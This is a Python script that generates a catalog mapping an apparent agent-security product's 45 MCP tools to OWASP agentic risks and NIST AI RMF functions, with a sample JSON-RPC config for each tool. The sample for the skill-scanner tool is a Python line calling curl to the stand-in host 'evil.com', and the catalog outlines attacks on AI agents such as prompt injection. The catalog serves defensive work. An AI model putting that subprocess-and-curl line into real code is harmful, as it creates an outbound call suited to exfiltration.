#!/usr/bin/env python3
"""
Generador del Catálogo y Campaña Técnica Formal:
Alineación de las 45 Herramientas MCP con OWASP Top 10 for Agentic Applications & NIST AI RMF.
Produce:
1. data/OWASP_NIST_45_TOOLS_CAMPAIGN_CATALOG.json
2. data/OWASP_NIST_45_TOOLS_CAMPAIGN_CATALOG.md
"""
import json
import logging
from pathlib import Path

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger("CampaignCatalogGenerator")

DATA_DIR = Path(__file__).resolve().parent.parent / "data"

OWASP_AGENTIC_DOMAINS = [
    {
        "id": "ASI-01",
        "name": "Agent Prompt Injection (Direct & Indirect)",
        "nist_function": "PROTECT / MANAGE",
        "threat_profile": "Semantic prompt smuggling through untrusted data ingestion, poisoning LLM control flows.",
        "tools": [
            {
                "tool_id": "#06",
                "name": "compile_gbnf_grammar",
                "purpose": "Restricción sintáctica determinista de logits mediante gramáticas GBNF libres de inyección.",
                "example_config": {"schema": {"type": "object", "properties": {"action": {"type": "string"}, "amount": {"type": "number"}}}},
                "use_case": "Compila una gramática estricta para evitar que una inyección indirecta obligue al LLM a emitir claves API."
            },
            {
                "tool_id": "#41",
                "name": "sanitize_delegated_task_payload",
                "purpose": "Inspección y censura determinista de secretos y tokens en payloads delegados.",
                "example_config": {"payload": "Analizar log de subagente con Bearer sk-ant-api03-...", "redaction_mode": "STRICT_MASK"},
                "use_case": "Censura claves de Anthropic/OpenAI antes de remitir el prompt a un worker no confiable."
            },
            {
                "tool_id": "#01",
                "name": "get_alpha_intelligence_feed",
                "purpose": "Ingestión sanitizada de inteligencia de amenazas 0-day en Moltbook.",
                "example_config": {"category_filter": "security", "sanitize_input": True},
                "use_case": "Consume alertas de seguridad sin exponer el contexto del agente a vectores de inyección en posts."
            }
        ]
    },
    {
        "id": "ASI-02",
        "name": "Broken Agent Authorization & Policy Drift",
        "nist_function": "GOVERN / PROTECT",
        "threat_profile": "Agentes ejecutando herramientas o pagos sin respetar políticas de límite o autorización.",
        "tools": [
            {
                "tool_id": "#44",
                "name": "evaluate_financial_policy_proxy",
                "purpose": "Cortafuegos financiero determinista con 5 reglas de política estrictas (FIN-01 a FIN-05).",
                "example_config": {"source_agent_id": "did:a2a:worker-01", "destination_agent_id": "did:a2a:vendor-99", "amount_sats": 5000, "session_spend_total_sats": 12000},
                "use_case": "Bloquea transferencias no autorizadas que excedan el límite de sesión o violen listas blancas de destinos."
            },
            {
                "tool_id": "#22",
                "name": "enforce_session_spending_limit",
                "purpose": "Circuit breaker financiero de sesión para neutralizar bucles infinitos de reintento.",
                "example_config": {"agent_id": "agent-crawler-04", "spending_cap_sats": 25000},
                "use_case": "Dispara un circuit breaker al detectar que un scraper en bucle consumió su cuota asignada."
            },
            {
                "tool_id": "#20",
                "name": "enforce_chain_postconditions",
                "purpose": "Validación criptográfica de pre- y postcondiciones en cadenas de herramientas multi-agente.",
                "example_config": {"execution_trace_id": "trace-8891", "expected_state_hash": "sha256:7f83b..."},
                "use_case": "Impide la transición a la fase de pago si la prueba criptográfica de ejecución previa no coincide."
            }
        ]
    },
    {
        "id": "ASI-03",
        "name": "Poisoned Skills & Uncurated Tool Supply Chain",
        "nist_function": "MAP / MEASURE",
        "threat_profile": "Skills o paquetes de marketplaces de agentes con malware incrustado (ClawHavoc stealer).",
        "tools": [
            {
                "tool_id": "#07",
                "name": "certify_skill_safety",
                "purpose": "Análisis estático de AST de código Python contra llamadas a subprocess, eval() y exfiltración.",
                "example_config": {"skill_source_code": "import subprocess; subprocess.Popen(['curl', 'evil.com'])"},
                "use_case": "Detecta y rechaza skills de ClawHub que intentan ejecutar payloads de exfiltración de credenciales."
            },
            {
                "tool_id": "#23",
                "name": "certify_mcp_marketplace_package",
                "purpose": "Auditoría formal de manifiestos y dependencias de paquetes MCP antes de su importación.",
                "example_config": {"package_manifest_url": "https://clawhub.com/skills/bob-p2p-beta.json"},
                "use_case": "Audita manifiestos contra inyecciones y permisos excesivos antes de permitir su carga en el runtime."
            },
            {
                "tool_id": "#37",
                "name": "report_malicious_agent",
                "purpose": "Registro y telemetría descentralizada de actores adversarios y clones Sybil.",
                "example_config": {"reporter_agent_id": "a2adefensegateway", "target_agent_id": "sybil_bot_44", "threat_category": "TROJAN_SKILL"},
                "use_case": "Informa a la red sobre un agente que distribuye scripts maliciosos para neutralizarlo colectivamente."
            },
            {
                "tool_id": "#38",
                "name": "query_agent_threat_score",
                "purpose": "Consulta en tiempo real del score CTI y reputación de seguridad de contrapartes.",
                "example_config": {"target_agent_id": "unknown_buyer_agent"},
                "use_case": "Evalúa el historial de incidentes de un agente antes de aceptar contratos o delegar tareas."
            }
        ]
    },
    {
        "id": "ASI-04",
        "name": "Multi-Agent Cascade Failures & Deadlocks",
        "nist_function": "MANAGE / RECOVER",
        "threat_profile": "Bloqueo de liquidez y procesos en cascada por dependencias asíncronas no coordinadas.",
        "tools": [
            {
                "tool_id": "#45",
                "name": "orchestrate_m2m_saga_transaction",
                "purpose": "Orquestación de Sagas distribuidas con confirmaciones en 2 fases y transacciones compensatorias.",
                "example_config": {"saga_id": "saga-compute-99", "steps": ["lock_collateral", "execute_inference", "settle_invoice"]},
                "use_case": "Ejecuta un rollback automático si el nodo de inferencia GPU colapsa en la fase 2."
            },
            {
                "tool_id": "#42",
                "name": "auto_refund_dormant_escrow",
                "purpose": "Reembolso determinista desatendido de fondos bloqueados en custodia inactiva.",
                "example_config": {"escrow_id": "escrow-deadlock-01", "inactivity_threshold_hours": 24},
                "use_case": "Libera el 100% de los satoshis en depósito al comprador cuando el vendedor queda inactivo."
            },
            {
                "tool_id": "#40",
                "name": "audit_agent_dependency_liveness",
                "purpose": "Sondeo de salud, latencia y disponibilidad de endpoints multi-agente en el enjambre.",
                "example_config": {"target_endpoints": ["https://agent1.local/health", "https://agent2.local/health"]},
                "use_case": "Redirige tráfico dinámicamente si un agente de la cadena de suministro excede 5000ms de latencia."
            }
        ]
    },
    {
        "id": "ASI-05",
        "name": "Hallucinated / Unverifiable Agent Outputs",
        "nist_function": "MEASURE / VERIFY",
        "threat_profile": "Resultados estocásticos fabricados presentados como tareas completadas sin evidencia empírica.",
        "tools": [
            {
                "tool_id": "#02",
                "name": "request_epistemic_audit",
                "purpose": "Auditoría de verdad factual y triangulación epistémica cruzada sobre afirmaciones clave.",
                "example_config": {"claim_text": "La SEC aprobó la exención bajo la regla 506(c).", "tolerance_score": 0.85},
                "use_case": "Verifica contra fuentes normativas primarias si la afirmación es cierta antes de proseguir."
            },
            {
                "tool_id": "#39",
                "name": "issue_verifiable_work_receipt",
                "purpose": "Emisión de comprobante criptográfico inmutable firmado con Ed25519 sobre el trabajo ejecutado.",
                "example_config": {"task_id": "audit-xml-001", "result_hash": "sha256:4a5b...", "executor_did": "did:a2a:gateway"},
                "use_case": "Genera una prueba matemática de realización de trabajo verificable por auditores externos."
            },
            {
                "tool_id": "#21",
                "name": "audit_context_pruning",
                "purpose": "Auditoría de pérdida de información y degradación semántica en la compresión de contexto.",
                "example_config": {"original_tokens": 128000, "compressed_tokens": 8000},
                "use_case": "Valida que cláusulas críticas de contratos no hayan sido eliminadas durante la poda de contexto."
            },
            {
                "tool_id": "#29",
                "name": "request_antigravity_reasoning",
                "purpose": "Oráculo de Test-Time Compute y Monte Carlo Tree Search (MCTS) para razonamiento crítico.",
                "example_config": {"problem_spec": "Optimización de topología multi-agente bajo restricciones USL", "rollouts": 64},
                "use_case": "Simula 64 escenarios adversariales antes de ejecutar una decisión irreversible."
            }
        ]
    },
    {
        "id": "ASI-06",
        "name": "Unconstrained Financial Execution & Ghost ATM",
        "nist_function": "PROTECT / GOVERN",
        "threat_profile": "Aprobación de transferencias o pagos de facturas fantasma sin comprobante de entrega.",
        "tools": [
            {
                "tool_id": "#04",
                "name": "create_escrow_deposit",
                "purpose": "Contrato de custodia colateralizado con bloqueo determinista de fondos y time-lock.",
                "example_config": {"buyer_did": "did:a2a:buyer", "seller_did": "did:a2a:seller", "amount_sats": 50000, "timeout_seconds": 3600},
                "use_case": "Bloquea fondos en escrow hasta que se verifique la firma del entregable técnico."
            },
            {
                "tool_id": "#05",
                "name": "arbitrate_dispute",
                "purpose": "Tribunal de arbitraje algorítmico basado en el libro de auditoría Why-Trail.",
                "example_config": {"escrow_id": "escrow-9921", "dispute_evidence_hash": "sha256:fe81..."},
                "use_case": "Resuelve disputas liberando o slashing colaterales según los eventos registrados en el ledger."
            },
            {
                "tool_id": "#08",
                "name": "request_l402_challenge",
                "purpose": "Generación de desafíos HTTP 402 sin estado con Macaroon criptográfico y factura Lightning.",
                "example_config": {"price_sats": 25, "caveats": ["tool=compute_procedural_deadline", "valid_until=1795240000"]},
                "use_case": "Emite un desafío de micropago que otorga acceso a la herramienta únicamente tras pagar la factura."
            },
            {
                "tool_id": "#09",
                "name": "verify_l402_payment",
                "purpose": "Validación criptográfica de preimágenes Lightning L402 sin almacenar estado en servidor.",
                "example_config": {"auth_header": "L402 <macaroon_base64>:<preimage_hex>"},
                "use_case": "Permite el consumo de inferencia sin cuentas de usuario, usando la prueba de pago en Lightning."
            },
            {
                "tool_id": "#10",
                "name": "redeem_credits_for_sats",
                "purpose": "Conversión y liquidación de créditos internos a Satoshis en la red Lightning de Bitcoin.",
                "example_config": {"agent_id": "a2adefensegateway", "credits_to_redeem": 1000, "lightning_address": "agent@getalby.com"},
                "use_case": "Permite a agentes satélites monetizar y retirar sus ganancias a billeteras Lightning soberanas."
            },
            {
                "tool_id": "#27",
                "name": "underwrite_execution_policy",
                "purpose": "Suscripción de seguro paramétrico agéntico contra penalizaciones y slashing colateral.",
                "example_config": {"coverage_amount_sats": 100000, "risk_tier": "TIER_A"},
                "use_case": "Cubre las pérdidas financieras de un agente ante caídas accidentales de conectividad o SLA."
            }
        ]
    },
    {
        "id": "ASI-07",
        "name": "Insecure Ephemeral Sandbox & Escape",
        "nist_function": "PROTECT / ISOLATE",
        "threat_profile": "Ejecución de código arbitrario generado por IA que compromete el sistema operativo anfitrión.",
        "tools": [
            {
                "tool_id": "#11",
                "name": "execute_sandboxed_computation",
                "purpose": "Runtime aislado determinista para ejecución segura de scripts Python con límites de CPU/RAM.",
                "example_config": {"script": "print(sum(range(1000)))", "timeout_seconds": 5, "memory_limit_mb": 128},
                "use_case": "Ejecuta cálculos matemáticos complejos sin exponer el sistema a bucles infinitos o fugas de memoria."
            },
            {
                "tool_id": "#32",
                "name": "dispatch_colab_gpu_job",
                "purpose": "Aislamiento y despacho de cargas de trabajo de alto cómputo a runtimes efímeros de GPU.",
                "example_config": {"notebook_target": "lora_training.ipynb", "gpu_type": "T4", "auto_teardown": True},
                "use_case": "Aísla el entrenamiento de modelos fuera de la infraestructura principal del agente."
            }
        ]
    },
    {
        "id": "ASI-08",
        "name": "Credential Exfiltration & Secret Leakage",
        "nist_function": "PROTECT / VAULT",
        "threat_profile": "Filtración de claves privadas de blockchain o API keys en logs o mensajes de contexto.",
        "tools": [
            {
                "tool_id": "#26",
                "name": "store_secret_envelope",
                "purpose": "Bóveda de custodia criptográfica con cifrado asimétrico y políticas de acceso multi-firma.",
                "example_config": {"secret_id": "sec-alby-nwc-01", "ciphertext": "enc:AES256:...", "authorized_dids": ["did:a2a:primary"]},
                "use_case": "Guarda de forma segura cadenas de conexión de billeteras NWC inaccesibles para el LLM."
            },
            {
                "tool_id": "#03",
                "name": "calculate_service_quote",
                "purpose": "Tarificación matemática sin exponer márgenes ni datos confidenciales del proveedor.",
                "example_config": {"service_type": "ast_forensics", "input_complexity": 3},
                "use_case": "Cotiza servicios de manera pública y determinista sin revelar los secretos de facturación."
            }
        ]
    },
    {
        "id": "ASI-09",
        "name": "Domain-Specific Hallucinations (Legal, Accounting, Forensics)",
        "nist_function": "MEASURE / VERIFY",
        "threat_profile": "Invención de artículos de ley, plazos procesales judiciales, balances contables o citaciones.",
        "tools": [
            {
                "tool_id": "#12",
                "name": "compute_procedural_deadline",
                "purpose": "Cómputo aritmético determinista de plazos procesales judiciales excluyendo feriados.",
                "example_config": {"start_date": "2026-11-20", "business_days": 15, "jurisdiction": "PJ_PERU"},
                "use_case": "Erradica alucinaciones de fechas de vencimiento en escritos de apelación y litigio."
            },
            {
                "tool_id": "#13",
                "name": "compute_us_procedural_deadline",
                "purpose": "Cálculo de plazos bajo las Federal Rules of Civil Procedure (FRCP Rule 6) y cortes estatales de EE.UU.",
                "example_config": {"filing_date": "2026-11-20", "days_count": 21, "rule_set": "FRCP_RULE_6"},
                "use_case": "Calcula el plazo legal exacto para responder demandas en cortes federales de EE.UU."
            },
            {
                "tool_id": "#14",
                "name": "validate_bluebook_citation",
                "purpose": "Linter determinista y verificador ontológico de citaciones jurídicas según The Bluebook.",
                "example_config": {"citation": "Brown v. Board of Educ., 347 U.S. 483 (1954)"},
                "use_case": "Detecta casos inventados y asegura el formato exacto en memorandos legales."
            },
            {
                "tool_id": "#15",
                "name": "search_us_court_opinions",
                "purpose": "Motor de recuperación indexada de opiniones y precedentes reales en CourtListener y Delaware.",
                "example_config": {"query": "merger fiduciary breach Chancery", "jurisdiction": "delaware_chancery"},
                "use_case": "Asegura que el agente cite únicamente precedentes judiciales existentes y verificados."
            },
            {
                "tool_id": "#16",
                "name": "verify_normative_validity",
                "purpose": "Verificación en grafo ontológico legal de vigencia temporal y derogaciones normativas.",
                "example_config": {"legal_norm_id": "Ley_31307", "evaluation_date": "2026-11-21"},
                "use_case": "Alerta si una norma citada por el LLM fue modificada o derogada por legislación posterior."
            },
            {
                "tool_id": "#17",
                "name": "audit_sunat_cpe_xml",
                "purpose": "Auditoría forense de comprobantes electrónicos XML, firmas digitales y reglas SUNAT.",
                "example_config": {"xml_document_base64": "PD94bWwgdmVyc2lvbj0..."},
                "use_case": "Verifica matemáticamente impuestos, hash digest y validez tributaria de facturas electrónicas."
            },
            {
                "tool_id": "#18",
                "name": "audit_excel_macro_forensics",
                "purpose": "Desensamblado y auditoría forense estática de macros VBA de hojas de cálculo de Excel.",
                "example_config": {"file_data_base64": "UEsDBBQAAAAIA..."},
                "use_case": "Extrae código malicioso ofuscado en macros antes de permitir la apertura del archivo contable."
            },
            {
                "tool_id": "#19",
                "name": "match_peruvian_procurement",
                "purpose": "Radar y clasificador de requerimientos técnicos de contrataciones con el Estado.",
                "example_config": {"procurement_tdr_text": "Contratación de servicios de consultoría...", "budget_uit": 8},
                "use_case": "Empareja ofertas técnicas contra directivas de OSCE sin omitir cláusulas obligatorias."
            },
            {
                "tool_id": "#43",
                "name": "audit_us_contract_clauses",
                "purpose": "Auditoría forense determinista de contratos comerciales (indemnización, limitación de daños).",
                "example_config": {"contract_text": "Licensor liability shall not exceed $100...", "risk_threshold": "HIGH"},
                "use_case": "Detecta cláusulas asimétricas o leoninas en acuerdos de licencia de software y SaaS."
            }
        ]
    },
    {
        "id": "ASI-10",
        "name": "Sybil Swarms, Reputational Drift & Lack of Provenance",
        "nist_function": "GOVERN / IDENTITY",
        "threat_profile": "Clones sintéticos que manipulan votaciones o reputación sin identidad verificable.",
        "tools": [
            {
                "tool_id": "#24",
                "name": "get_agent_reputation_profile",
                "purpose": "Buró de crédito y reputación A2A: credit score (0-1000) e historial de cumplimiento.",
                "example_config": {"agent_id": "did:a2a:vendor-44"},
                "use_case": "Evalúa la confiabilidad histórica de un agente antes de comprometer capital en escrow."
            },
            {
                "tool_id": "#25",
                "name": "submit_service_feedback",
                "purpose": "Registro inmutable de satisfacción (CSAT) firmado criptográficamente tras el servicio.",
                "example_config": {"service_ticket_id": "ticket-99", "score_stars": 5, "feedback_hash": "sha256:7a..."},
                "use_case": "Registra una evaluación fiduciaria imposible de falsificar por granjas de bots."
            },
            {
                "tool_id": "#28",
                "name": "recalibrate_agent_cognition",
                "purpose": "Diagnóstico y reinicio determinista de agentes con desincronización cognitiva o bucles.",
                "example_config": {"agent_id": "agent-drifted-01", "diagnostic_trace": "Bucle de retry infinito en step 3"},
                "use_case": "Restaura los pesos operativos y límites de memoria de un bot antes de que cause daños."
            },
            {
                "tool_id": "#30",
                "name": "attest_agent_did_identity",
                "purpose": "Emisión y certificación de documentos W3C DID respaldados por claves Ed25519.",
                "example_config": {"agent_handle": "a2athreatintel", "public_key_hex": "0331537b..."},
                "use_case": "Otorga identidad criptográfica soberana y portable entre Moltbook, Nostr y Agentverse."
            },
            {
                "tool_id": "#31",
                "name": "dispatch_agent_transactional_email",
                "purpose": "Despacho de notificaciones transaccionales autenticadas con SPF/DKIM para humanos a cargo.",
                "example_config": {"to": "ciso@empresa.com", "subject": "Alerta de Slashing", "body": "Incidente crítico..."},
                "use_case": "Notifica inmediatamente al operador humano cuando se detecta una anomalía de seguridad."
            },
            {
                "tool_id": "#33",
                "name": "query_deep_context_archive",
                "purpose": "Búsqueda en depósitos masivos de memoria histórica corporativa (hasta 2M tokens).",
                "example_config": {"query": "Resolución de disputa de escrow de 2026-11-19"},
                "use_case": "Recupera la justificación exacta de decisiones previas sin sufrir de alucinación contextual."
            },
            {
                "tool_id": "#34",
                "name": "publish_enterprise_artifact",
                "purpose": "Publicación y catalogación de artefactos formales inmutables en Google Docs / HTML.",
                "example_config": {"title": "Informe de Auditoría Forense", "format": "STANDALONE_HTML"},
                "use_case": "Genera reportes técnicos fiduciarios para presentación ante directorios y juntas C-level."
            },
            {
                "tool_id": "#35",
                "name": "generate_audio_briefing",
                "purpose": "Síntesis neuronal dialéctica estilo NotebookLM entre dos interlocutores para juntas ejecutivas.",
                "example_config": {"source_report": "Resumen ejecutivo de incidentes CTI", "format": "TWO_SPEAKER"},
                "use_case": "Convierte auditorías complejas en briefings de audio de 5 minutos para consumo rápido de ejecutivos."
            },
            {
                "tool_id": "#36",
                "name": "sync_tabular_ledger",
                "purpose": "Sincronización de registros transaccionales en bases de datos relacionales y hojas de cálculo.",
                "example_config": {"sheet_name": "Ledger_A2A_2026", "rows": [{"timestamp": "2026-11-21", "amount": 2500}]},
                "use_case": "Mantiene un registro de doble partida accesible tanto para agentes como para contadores humanos."
            }
        ]
    }
]

def main():
    DATA_DIR.mkdir(parents=True, exist_ok=True)
    json_path = DATA_DIR / "OWASP_NIST_45_TOOLS_CAMPAIGN_CATALOG.json"
    with open(json_path, "w", encoding="utf-8") as f:
        json.dump(OWASP_AGENTIC_DOMAINS, f, indent=2, ensure_ascii=False)
    logger.info(f"JSON catalog saved to {json_path}")

    # Generate Markdown documentation
    md_path = DATA_DIR / "OWASP_NIST_45_TOOLS_CAMPAIGN_CATALOG.md"
    with open(md_path, "w", encoding="utf-8") as f:
        f.write("# Catálogo Formal de Campaña: Alineación de las 45 Herramientas MCP con OWASP Agentic Top 10 y NIST AI RMF\n\n")
        f.write("Este documento técnico presenta la asignación exhaustiva de las 45 herramientas de producción de A2A Defense Gateway (https://a2a.vilmamonroy.com) a los 10 dominios de riesgo crítico definidos por OWASP y las 4 funciones del NIST AI Risk Management Framework (GOVERN, MAP, MEASURE, MANAGE).\n\n")
        
        for dom in OWASP_AGENTIC_DOMAINS:
            f.write(f"## {dom['id']}: {dom['name']}\n")
            f.write(f"**Función NIST**: `{dom['nist_function']}`  \n")
            f.write(f"**Vector de Amenaza**: {dom['threat_profile']}\n\n")
            f.write("### Herramientas MCP y Casos de Uso:\n\n")
            for t in dom["tools"]:
                f.write(f"#### Tool {t['tool_id']}: `{t['name']}`\n")
                f.write(f"- **Propósito**: {t['purpose']}\n")
                f.write(f"- **Caso de Uso en Producción**: {t['use_case']}\n")
                f.write(f"- **Configuración / Payload JSON-RPC**:\n")
                f.write("```json\n")
                f.write(json.dumps({
                    "jsonrpc": "2.0",
                    "id": f"call-{t['name']}",
                    "method": "tools/call",
                    "params": {
                        "name": t['name'],
                        "arguments": t['example_config']
                    }
                }, indent=2) + "\n")
                f.write("```\n\n")
            f.write("---\n\n")
            
    logger.info(f"Markdown catalog saved to {md_path}")

if __name__ == "__main__":
    main()
